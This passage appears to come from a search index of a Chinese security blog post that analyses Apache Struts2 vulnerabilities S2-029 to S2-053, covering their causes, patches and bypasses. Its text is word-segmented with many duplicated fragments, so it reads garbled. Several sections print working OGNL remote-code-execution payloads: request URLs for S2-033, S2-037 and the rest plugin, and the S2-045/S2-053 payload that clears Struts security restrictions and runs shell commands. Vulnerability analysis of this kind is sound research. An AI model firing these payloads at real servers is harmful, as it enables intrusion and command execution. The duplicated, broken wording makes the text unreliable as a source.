  \uff0c \u8fd9\u91cc \u662f \u5bf9 S2 - 009 \u505a \u7684 \u9650\u5236 \uff0c \u4e5f \u5c31\u662f \u5f53 \u51fa\u73b0   ( ( 1 ) ( 2 ) )   \u65f6 \uff0c \u4f1a \u89e3\u6790 \u51fa   ASTEval   \u8282\u70b9 \uff0c \u800c   ASTEval   \u5bf9\u8c61 \u7684   isEvalChain   \u51fd\u6570 \u76f4\u63a5 \u8fd4\u56de true \uff0c \u4e5f \u5c31 \u4f7f\u5f97   ( 1 ) ( 2 )   \u65e0\u6cd5 \u6267\u884c   \u5176\u6b21 \u518d \u6765\u770b   node . isSequence   \uff0c \u8fd9\u91cc \u662f \u5bf9 \u5f62\u5982   ( xxx1 , xxx2 , xxx3 )   \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u9650\u5236 \uff0c \u4ed6 \u5c06 \u89e3\u6790 \u51fa   ASTSequence   \u8282\u70b9 \uff0c   ASTSequence   \u5bf9\u8c61 \u7684   isSequence   \u76f4\u63a5 \u8fd4\u56de true \uff0c \u4e5f \u5c31 \u9650\u5236 \u4e86 \u8fd9\u79cd \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u7136\u540e \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f \uff0c \u5bf9\u4e8e \u5f62 \u5982   ( ( xxx1 ) . ( xxx2 ) . ( xxx3 ) )   \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u8fd9\u662f \u4e00\u79cd   ASTChain   \uff0c \u4f46 \u5176\u4e2d \u5e76 \u4e0d\u4f1a \u89e3\u6790 \u51fa   ASTEval   \u770b \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u77e5\u9053 \u53ef\u4ee5 \u5c06 S2 - 029 \u7684 \u4fee\u590d bypass \u6389 \uff0c \u4e5f \u5c31\u662f S2 - 036 \u7684 \u95ee\u9898","title":"\u4fee\u590d S2 - 029"},{"location":"blog/2020/talk_about_struts2/#13-s2-032s2-033s2-037","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.3 . 20   -   Struts   Struts   2.3 . 28   ( except   2.3 . 20.3   and   2.3 . 24.3 )   \u8fd9\u91cc \u6211 \u7684 \u73af\u5883 \u642d \u7684 \u662f rest - showcase \u7684 \uff0c \u6240\u4ee5 \u4e3b\u8981 \u8bb2 S2 - 033 \uff08 S2 - 032 \u7684 \u539f\u7406 \u8ddf \u4ed6 \u4e0d\u591a \u5dee\u4e0d\u591a \uff0c \u53ea\u662f \u89e6\u53d1 \u53d8\u6210 \u4e86   method : #_ xxxx   )   rest - plugin \u652f\u6301 \u89e3\u6790   xxx ! method   \u7684 \u8c03\u7528   org . apache . struts2 . rest . RestActionMapper # handleDynamicMethodInvocation   \u89e3\u6790   name ! method   \uff0c \u5e76 \u5bf9 \u5f53\u524d \u7684   restactionmapper   \u8bbe\u7f6e \u597d \u540e\u7eed \u8981 \u8c03\u7528 method   \u5728 struts2 \u7684 \u6240\u6709 intercepter \u8c03\u7528 \u5b8c\u6bd5 \u540e \uff0c \u4f1a \u53bb \u8c03\u7528 DefaultActionInvocation \u7684 invokeActionOnly \u51fd\u6570   \u800c invokeActionOnly \u4f1a \u53bb \u8c03\u7528   com . opensymphony . xwork2 . DefaultActionInvocation # invokeAction   \u5728 \u8fd9\u4e2a \u51fd\u6570 \u91cc \uff0c \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u4ed6 \u5c06 \u524d\u9762 \u53ef\u63a7 \u7684 methodName \u653e\u8fdb \u4e86   ognlUtil . getValue   \uff0c \u5bfc\u81f4 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u5728 \u524d\u9762 \u8c03\u7528 \u7684 interceptor \u91cc \u4e0d\u80fd \u51fa\u73b0 \u5f02\u5e38 \u51fa\u73b0\u5f02\u5e38 \u7684 \u60c5\u51b5 \uff0c \u4f1a \u5bfc\u81f4 \u65e0\u6cd5 \u6267\u884c \u5230 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u7684 \u4f4d\u7f6e \u3002 \u8fd9 \u4e5f \u5c31\u662f \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u4e0d\u80fd \u5728 \u5f00\u542f   devMode   \u7684 \u60c5\u51b5 \u4e0b \u8fdb\u884c \u5229\u7528 \u7684 \u539f\u56e0 \u3002","title":"13 .   S2 - 032 / S2 - 033 / S2 - 037"},{"location":"blog/2020/talk_about_struts2/#poc_12","text":"http   :   / / localhost : 8080 / showcase _ war / orders / 3 ! % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS% 2C% 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) % 2C% 23xx% 3D123% 2C% 23xx . toString . json ? command = ifconfig   / /   S2 - 037   http   :   / / localhost : 8080 / showcase _ war / orders / 3 ! ( % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS ) % 3F ( % 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) ) % 3Ad . json ? command = ifconfig   \u8fd9\u91cc \u6211\u4eec \u6267\u884c \u7684 \u547d\u4ee4 \u7528   # parameters . command [ 0 ]   \u7684 \u65b9\u5f0f \u6765 \u83b7\u53d6 \uff0c \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a \u5728 \u751f\u6210   DefaultActionProxy   \u7684 \u65f6\u5019 \u5bf9 methodName \u505a \u4e86 \u8f6c\u4e49 \u5904\u7406 \uff0c \u4e3a\u4e86 \u907f\u514d \u8f6c\u4e49 \u7834\u574f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u7528   # parameters   \u7684 \u65b9\u5f0f \u4ece \u53c2\u6570 \u4e2d \u83b7\u53d6 \u3002   \u8fd8\u6709 \u4e00\u4e2a \u9700\u8981 \u6ce8\u610f \u7684 \u5730\u65b9 \u662f \uff0c \u5728 \u6700\u540e \u8c03\u7528   ognlUtil . getValue   \u65f6 \uff0c \u5728 methodName \u540e\u9762 \u62fc\u63a5 \u4e86   ( )   \uff0c \u6211\u4eec \u9700\u8981 \u5c06 \u8fd9\u4e2a   ( )   \u505a \u5904\u7406 \uff0c \u6bd4\u5982 \u8fd9\u91cc \u7684 POC \u505a \u7684 \u5904\u7406 \u662f   # xx . toString   \u53bb \u5403\u6389 \u8fd9\u4e2a   ( )","title":"POC"},{"location":"blog/2020/talk_about_struts2/#s2-032s2-033","text":"xwork - core : 2.3 . 28.1   \u5728   OgnlUtil . isEvalExpression   \u589e\u52a0 \u4e86   isSequence   \u7684 \u5224\u65ad   \u8fd9\u91cc \u51fa\u73b0 \u4e86 \u65b0 \u7684 \u4e00\u79cd \u5229\u7528 \u65b9\u5f0f   ( 1 ) ? ( 2 ) : ( 3 )   \uff0c \u8fd9\u79cd \u5f62\u5f0f \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5c06 \u6709   ASTTest   \u5bf9\u8c61 \u6765 \u5904\u7406   \u800c   isEvalChain ( )   \u548c   isSequence ( )   \u9650\u5236 \u7684 \u662f   ASTEval   \u548c   ASTSequence   \u5bf9\u8c61 \uff0c \u8fd9\u91cc \u5e76 \u6ca1\u6709 \u5bf9 ASTTest \u505a \u9650\u5236 \uff0c \u5e76\u4e14 \u7531\u4e8e   isSequence   \u5e76 \u4e0d\u662f \u9012\u5f52 \u53bb \u5224\u65ad \u7684 \uff0c \u6240\u4ee5 \u5728   ASTTest   \u7684 children \u8282\u70b9 \u4e0a \u518d \u51fa\u73b0   ASTSequence   \u4e5f \u662f ok \u7684   \u6839\u636e \u8fd9\u4e2a \u539f\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5199\u51fa \u65b0 \u7684 POC   (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   )   ?   (   #   process   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   #   parameters   .   command   [   0   ]   ) ,   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ,   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ,   #   ros   .   flush   ( ) ) :   d   .   json","title":"S2 - 032 / S2 - 033 \u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#s2-037","text":"\u5728 \u89e3\u6790   name ! method   \u7684 \u5730\u65b9 \uff0c \u8c03\u7528 \u4e86   cleanupActionName   \u4f7f\u7528 \u4e86 \u6b63\u5219 \uff0c \u9632\u6b62 \u51fa\u73b0 \u9632\u6b62\u51fa\u73b0   ( # @ )   \u7b49 \u7279\u6b8a \u5b57\u7b26 \u7279\u6b8a\u5b57\u7b26 \uff0c \u51fa\u73b0 \u5c31 \u62a5\u9519 \uff0c \u4e5f \u5c31 \u5230 \u4e0d\u4e86 \u540e\u7eed \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u5e76\u4e14 \u5728 \u7981\u6b62 \u7684 class \u5217\u8868 \u91cc \u589e\u52a0 \u4e86 \u4e24\u4e2a   \u4f7f\u5f97 \u6211\u4eec \u4e0d\u80fd \u5728 \u7528   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u6765 \u7ed5\u8fc7 \u9650\u5236","title":"S2 - 037 \u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#_12","text":"\u524d\u9762 \u8bf4 \u5230 \u8fd9 3 \u4e2a \u6f0f\u6d1e \u9700\u8981 \u5f00\u542f DynamicMethodInvocation \uff0c \u5176\u5b9e \u4e0d \u5f00\u542f \u4e5f \u662f \u53ef\u4ee5 \u7684   \u524d\u9762 \u8bf4 \u7684 \u51e0\u79cd \u65b9\u6cd5 \u90fd \u662f \u5728 \u5904\u7406   name ! method   \u8fd9\u4e2a \u683c\u5f0f \uff0c rest \u5176\u5b9e \u8fd8 \u652f\u6301 \u5bf9   action / id / method   \u7684 \u89e3\u6790   \u6240\u4ee5 \u6539\u6539 POC \u5c31 \u80fd \u901a\u6740 rest - plugin \u4e86   http   :   / / localhost : 8080 / showcase _ war / orders / 3 / ( % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS ) % 3F ( % 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) ) % 3Ad . json ? command = ifconfig","title":"\u4e00\u4e2a \u6709\u610f\u601d \u7684 \u5730\u65b9"},{"location":"blog/2020/talk_about_struts2/#14-s2-045s2-046","text":"\u5f71\u54cd \u7248\u672c \uff1a Struts   2.3 . 5   -   Struts   2.3 . 31 ,   Struts   2.5   -   Struts   2.5 . 10   S2 - 046 \u539f\u7406 \u4e00\u6837 \uff0c \u8fd9\u91cc \u53ea \u5206\u6790 S2 - 045   \u8fd9\u91cc 2.3 \u548c 2.5 \u7248\u672c \u53d8\u5316 \u6bd4\u8f83 \u5927 \uff0c \u8fd9\u91cc \u4ee5 2.3 . 31 \u7684 \u4ee3\u7801 \u5206\u6790 \uff0c \u770b 2.5 \u7684 \u53ef\u4ee5 \u770b https : / / paper . seebug . org / 247 /   \u4ece struts2 \u7684 \u5de5\u4f5c \u6d41\u7a0b \u6d41\u7a0b\u56fe \u6765\u770b \uff0c \u6240\u6709 \u7684 \u8bf7\u6c42 \u5728 \u751f\u6210 ActionProxy \u4e4b\u524d \uff0c \u90fd \u7531 FilterDispatcher \u6765 \u5904\u7406 \uff0c 2.3 \u7248\u672c \u7528 \u7684 \u662f   org . apache . struts2 . dispatcher . ng . filter . StrutsPrepareAndExecuteFilter   \uff0c \u8fd9\u91cc \u5728 \u8c03\u7528 action \u4e4b\u524d \u4f1a\u5148 \u5c01\u88c5 request \u3002   \u770b\u770b \u8c03\u7528 \u6808   \u5c01\u88c5 \u5b9e\u9645 \u7531   org . apache . struts2 . dispatcher . Dispatcher # wrapRequest   \u5904\u7406   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u5728 \u5904\u7406   Content - Type :   multipart / form - data   \u7c7b\u578b \u65f6 \uff0c \u4f1a \u751f\u6210   org . apache . struts2 . dispatcher . multipart . MultiPartRequestWrapper   \u5904\u7406 \uff0c S2 - 045 \u5c31\u662f \u51fa \u95ee\u9898 \u5728 \u8fd9\u91cc   \u5728 \u7528   JakartaMultiPartRequest   \u89e3\u6790 request \u5305\u65f6 \uff0c \u8c03\u7528   org . apache . commons . fileupload . FileUploadBase . FileItemIteratorImpl # FileItemIteratorImpl   \u6765 \u68c0\u67e5 Content - Type \u7684 \u5185\u5bb9 \uff0c \u9700\u8981 \u7531 multipart / \u5f00\u5934 \u624d\u884c \uff0c \u4e0d\u7136 \u5c31\u662f \u62a5\u9519 \u5e76 \u5c06 \u5177\u4f53 \u7684 contentType \u5185\u5bb9 \u5199 \u5230 \u5f02\u5e38 \u91cc   \u8fd9\u91cc \u6211\u4eec \u7684 \u53ef\u63a7 \u6570\u636e \u5c31 \u5230 \u4e86 \u5f02\u5e38 \u4e0a \uff0c \u5c31 \u770b struts2 \u662f \u600e\u4e48 \u5904\u7406 \u5f02\u5e38 \u4e86   org . apache . struts2 . dispatcher . multipart . JakartaMultiPartRequest # parse   \u53ef\u63a7 \u5185\u5bb9 \u4f20\u5165 \u4e86   com . opensymphony . xwork2 . util . LocalizedTextUtil # findText   \u5f53\u524d \u90fd \u6ca1 \u751f\u6210 \u9519\u8bef \u8bef\u4fe1 \u4fe1\u606f \u9519\u8bef\u4fe1\u606f \u65f6 \uff0c \u5c06 \u83b7\u53d6 \u9ed8\u8ba4 \u7684 message   \u8fd9\u91cc \u5230 \u4e86 \u6211\u4eec \u719f\u6089 \u7684   TextParseUtil . translateVariables   \u51fd\u6570 \uff0c \u4ed6 \u540e\u7eed \u4f1a \u5904\u7406 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u7b80\u5355 \u6765\u8bf4 \uff0c \u6574\u4e2a \u8fc7\u7a0b \u4ece \u62a5\u9519 \u5f00\u59cb \u5b58\u5165 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u518d \u751f\u6210 \u9519\u8bef \u8bef\u4fe1 \u4fe1\u606f \u9519\u8bef\u4fe1\u606f \u7684 \u65f6\u5019 \u8ba1\u7b97 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u5230 \u4e86 \u8fd9\u91cc \u6267\u884c \u53ef\u63a7 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u662f \u7b2c\u4e00 \u4e00\u6b65 \u7b2c\u4e00\u6b65 \uff0c \u56e0\u4e3a 2.3 . 29 \u589e\u52a0 \u4e86 \u5bf9   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u7684 \u9650\u5236   \u9700\u8981 \u4e00\u79cd \u65b0 \u7684 \u601d\u8def \u6765 \u7ed5\u8fc7 \uff0c S2 - 045 \u7684 POC \u5c31 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u8fd9\u6837 \u4e00\u4e2a \u601d\u8def","title":"14 .   S2 - 045 / S2 - 046"},{"location":"blog/2020/talk_about_struts2/#poc_13","text":"%   {   (   #   _   =   '   multipart   /   form   -   data   '   ) .   (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) .   (   #   _ memberAccess   ?   (   #   _ memberAccess   =   #   dm   ) :   (   (   #   container   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) .   (   #   ognlUtil   =   #   container   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) .   (   #   ognlUtil   .   getExcludedPackageNames   ( ) .   clear   ( ) ) .   (   #   ognlUtil   .   getExcludedClasses   ( ) .   clear   ( ) ) .   (   #   context   .   setMemberAccess   (   #   dm   ) ) ) ) .   (   #   cmd   =   '   id   '   ) .   (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) .   (   #   cmds   =   (   #   iswin   ?   {   '   cmd   .   exe   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) .   (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) .   (   #   p   .   redirectErrorStream   (   true   ) ) .   (   #   process   =   #   p   .   start   ( ) ) .   (   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ) .   (   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ) .   (   #   ros   .   flush   ( ) )   }   \u4e3b\u8981 \u770b 5 - 10 \u884c \uff0c \u4e00 \u5f00\u59cb \u7684 \u601d\u8def \u662f \u76f4\u63a5 \u7528 \u8d4b\u503c \u7684 \u65b9\u5f0f \u6765 \u8986\u76d6 \u5b58\u5728 \u9650\u5236 \u7684 SecurityMemberAccess \uff0c \u4f46\u662f \u73b0\u5728 \u6709 \u4e86   excludedClasses   \u7684 \u9650\u5236 \u4e0d\u80fd \u76f4\u63a5 \u7528 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8fbe\u6210 \uff08 \u5177\u4f53 \u770b   SecurityMemberAccess . isAccessible   \uff09 \u3002   \u90a3\u4e48 \u5c31 \u770b\u770b \u80fd \u4e0d\u80fd \u7528 setters \u53bb \u8bbe\u7f6e   SecurityMemberAccess   \u8fd9\u91cc \u5c31 \u770b   ognl . OgnlContext # setMemberAccess   \uff0c \u800c \u8fd9\u4e2a context \u5c31\u662f \u6211\u4eec \u5728 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u91cc \u7528   # context   \u8868\u793a \u7684   \u90a3\u4e48 \u76f4\u63a5 \u7528   # context . setMemberAccess ( @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS )   \u5c31 \u53ef\u4ee5 \u8986\u76d6 \u539f\u6709 \u7684 MemberAccess \uff0c \u4f46\u662f \u56e0\u4e3a   # context   \u672c\u8eab \u5c31\u662f \u88ab \u7981\u6b62 \u7684 \u7c7b \uff0c \u6211\u4eec \u4e0d\u80fd \u76f4\u63a5 \u8c03\u7528 \u4ed6 \u3002   \u6211\u4eec \u9700\u8981 \u9996\u5148 \u53bb \u9664\u6389   ExcludedPackageNames   \u548c   ExcludedClasses   \u6765 \u770b\u770b \u4ed6 \u662f \u600e\u4e48 \u8bbe\u7f6e \u7684   com . opensymphony . xwork2 . ognl . OgnlValueStack # setOgnlUtil   \u53ef\u4ee5 \u770b\u5230   securityMemberAccess   \u7684 \u76f8\u5173 \u7981\u7528 \u8bbe\u7f6e \u90fd \u662f \u6765\u81ea \u4e8e   ognlUtil   \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ea \u9700\u8981 \u6e05\u9664 \u6389   ognlUtil   \u7684 \u7981\u7528 \u8bbe\u7f6e \u5c31 \u53ef\u4ee5 \u6d88\u9664 \u6389   securityMemberAccess   \u7684 \u9650\u5236 \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a \u5728 jvm \u91cc\u9762 \u4ed6\u4eec \u7528 \u7684 \u90fd \u662f \u540c\u4e00 \u4e00\u4e2a \u540c\u4e00\u4e2a \u5b9e\u4f8b \u3002   \u6240\u4ee5 \u4e0a\u9762 \u7684 POC \u4e2d\u7528 struts2 \u7684 container \u7684 \u65b9\u5f0f \u53bb \u83b7\u53d6 ognlUtil \u5b9e\u4f8b \uff0c \u5e76 \u5c06 \u5176 \u7981\u7528 \u8bbe\u7f6e \u5168\u90e8 \u6e05\u9664 \u6389   \u90a3\u4e48 \u540e\u9762 \u518d\u7528   # context . setMemberAccess   \u5c31 \u6ca1\u6709 \u963b\u788d \u4e86   \u540e\u7eed \u7684 \u4ee3\u7801 \u5c31\u662f \u6267\u884c \u5e76 \u56de\u663e \u4e86 \uff0c \u8ddf \u524d\u9762 \u7684 \u7c7b\u4f3c","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_13","text":"\u4fee\u590d \u4e3b\u8981 \u662f \u4e0d \u628a message \u4f20\u5165 \uff0c \u653e\u5230 \u4e86 args \u7684 \u4f4d\u7f6e","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#15-s2-048","text":"\u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u4ed4\u7ec6 \u8bf4 \u4e86 \uff0c \u770b https : / / www . freebuf . com / vuls / 217482 . html","title":"15 .   S2 - 048"},{"location":"blog/2020/talk_about_struts2/#16-s2-052","text":"\u5f71\u54cd \u8303\u56f4 : Struts   2.1 . 6   -   Struts   2.3 . 33 ,   Struts   2.5   -   Struts   2.5 . 12   The   REST   Plugin   is   using   a   XStreamHandler   with   an   instance   of   XStream   for   deserialization   without   any   type   filtering   and   this   can   lead   to   Remote   Code   Execution   when   deserializing   XML   payloads .   struts2 \u7684 rest \u63d2\u4ef6 \u6ce8\u518c \u4e86 ContentTypeInterceptor \u6765 \u5904\u7406 \u4e0d\u540c \u7684 content - type   \u9488\u5bf9 xml \u7c7b\u578b \uff0c \u5c06 \u8c03\u7528   XStreamHandler   \u6765 \u5904\u7406   org . apache . struts2 . rest . ContentTypeInterceptor # intercept   \u6839\u636e request \u8bf7\u6c42 \u9009\u62e9 handler \uff0c \u8fd9\u91cc \u6211\u4eec \u4f20\u5165   application / xml   \u7c7b\u578b \uff0c \u5c06 \u4f7f\u7528   org . apache . struts2 . rest . handler . XStreamHandler # toObject   \u6765 \u5904\u7406 xml   \u8fd9\u91cc \u7528 \u4e86 \u6700 \u7b80\u5355 \u7684 \u8c03\u7528 \u65b9\u5f0f \uff08 1.4 . 8 \u7248\u672c \uff09 \uff0c \u6ca1\u6709 \u505a xstream \u7684 \u76f8\u5173 \u5b89\u5168 \u5904\u7406 \uff0c \u5bfc\u81f4 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u6240\u4ee5 \u6211\u4eec \u4f20\u5165 \u6784\u9020 \u597d \u7684 XML \u5c31 \u53ef\u4ee5 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c","title":"16 .   S2 - 052"},{"location":"blog/2020/talk_about_struts2/#poc_14","text":"\u8fd9\u91cc \u7684 xml \u53ef\u4ee5 \u7528 \u6211 \u7684 ysomap \u53bb \u751f\u6210 \uff0c \u628a Content - Type \u8bbe\u7f6e \u6210   application / xml   \u5c31 \u53ef\u4ee5 \u4e86","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_14","text":"S2 - 052 \u8ddf \u4ee5\u5f80 \u7684 \u6f0f\u6d1e \u4e0d \u4e00\u6837 \uff0c \u8fd9\u91cc \u8ddf OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5e76 \u6ca1\u6709 \u4ec0\u4e48 \u5173\u7cfb \u4e86 \uff0c \u4fee\u590d \u4e5f \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355   \u5347\u7ea7 XStream \u5230 \u4e86 1.4 . 10 \u7248\u672c \uff0c \u5e76\u4e14 \u6dfb\u52a0 \u4e86 \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd   \u8fd9\u91cc \u65b0 \u6dfb\u52a0 \u4e86   AllowedClasses   \u3001   AllowedClassNames   \u3001   XStreamPermissionProvider   \u6765 \u8bbe\u7f6e \u6bcf\u4e2a \u7c7b \u53ef\u4ee5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \u5217\u8868   \u4e5f \u4f1a \u6dfb\u52a0 \u4e00\u4e9b \u9ed8\u8ba4 \u7684 \u7c7b   \u8fd9\u91cc \u7684 \u7528\u6cd5 \u5c31\u662f XStream \u5b98\u65b9 \u63a8\u8350 \u7684 \uff0c \u91c7\u7528 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u9632\u6b62 \u4e0d \u5b89\u5168 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#17-s2-053","text":"\u5f71\u54cd \u7248\u672c : Struts   2.0 . 0   -   2.3 . 33   , Struts   2.5   -   Struts   2.5 . 10.1   S2 - 053 \u95ee\u9898 \u51fa \u5728 freemarker \u7684 \u6807\u7b7e \u5185\u5bb9 \u53ef\u63a7 \u65f6 \u51fa\u73b0 \u7684 \u95ee\u9898   \u5728 action \u6267\u884c \u7ed3\u675f \u540e \uff0c \u7531\u4e8e \u8bbe\u7f6e \u7684 \u7c7b\u578b \u4e3a freemarker \uff0c \u6240\u4ee5 \u7ed3\u679c \u4ea4\u7531 freemarker \u6765 \u5904\u7406   \u5173\u6ce8 \u5bf9 freemarker \u6807\u7b7e \u89e3\u6790 \u7684 \u7c7b   org . apache . struts2 . views . freemarker . tags . CallbackWriter # onStart   \u56e0\u4e3a \u8fd9\u91cc \u6211\u4eec \u65f6 url \u6807\u7b7e \uff0c \u6240\u4ee5 \u7531   org . apache . struts2 . components . URL # start   \u6765 \u5904\u7406   \u56de\u5230 \u4e86 \u7531   ServletUrlRenderer   \u6765 \u89e3\u6790 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u8ddf S2 - 013 \u4e00\u6837 \uff0c \u540e\u7eed \u4e5f \u662f \u7531   TextParseUtil . translateVariables   \u89e6\u53d1 \u7684","title":"17 .   S2 - 053"},{"location":"blog/2020/talk_about_struts2/#poc_15","text":"poc \u53ef\u4ee5 \u76f4\u63a5 \u7528 S2 - 045 \u7684 poc   %   { (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   #   _ memberAccess   ?   (   #   _ memberAccess   =   #   dm   ) : ( (   #   container   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) . (   #   ognlUtil   =   #   container   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) . (   #   ognlUtil   .   getExcludedPackageNames   ( ) .   clear   ( ) ) . (   #   ognlUtil   .   getExcludedClasses   ( ) .   clear   ( ) ) . (   #   context   .   setMemberAccess   (   #   dm   ) ) ) ) . (   #   cmd   =   '   id   '   ) . (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) . (   #   cmds   =   (   #   iswin   ?   {   '   cmd   .   exe   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) . (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) . (   #   p   .   redirectErrorStream   (   true   ) ) . (   #   process   =   #   p   .   start   ( ) ) . (   @ org . apache . commons . io . IOUtils @ toString   (   #   process   .   getInputStream   ( ) ) ) }   / /   \u8bb0\u5f97 \u7f16\u7801","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_15","text":"\u8fd9\u6b21 \u7684 \u4fee\u590d \u662f \u5728 FreemarkerManager \u4e2d\u591a \u4e86 \u4e24\u884c \u4ee3\u7801 \uff0c   LOG . debug ( \" Sets   NewBuiltinClassResolver   to   TemplateClassResolver . SAFER _ RESOLVER \" ,   new   String [ 0 ] ) ;   configuration . setNewBuiltinClassResolver ( TemplateClassResolver . SAFER _ RESOLVER ) ;   \u53bb \u770b \u4e86 \u4e00\u4e0b TemplateClassResolver . SAFER _ RESOLVER ) \u7684 \u5b98\u65b9 \u6587\u6863 \uff0c   TemplateClassResolver . SAFER _ RESOLVER   now   disallows   creating   freemarker . template . utility . JythonRuntime   and   freemarker . template . utility . Execute .   This   change   affects   the   behavior   of   the   new   built - in   if   FreeMarker   was   configured   to   use   SAFER _ RESOLVER ,   which   is   not   the   default   until   2.4   and   is   hence   improbable .   \u5927\u81f4 \u610f\u601d \u5e94\u8be5 \u5c31\u662f \u7981\u6b62 \u4e86 freemarker \u7684 RCE \uff0c \u5177\u4f53 \u6211 \u5bf9 freemarker \u4e0d\u592a 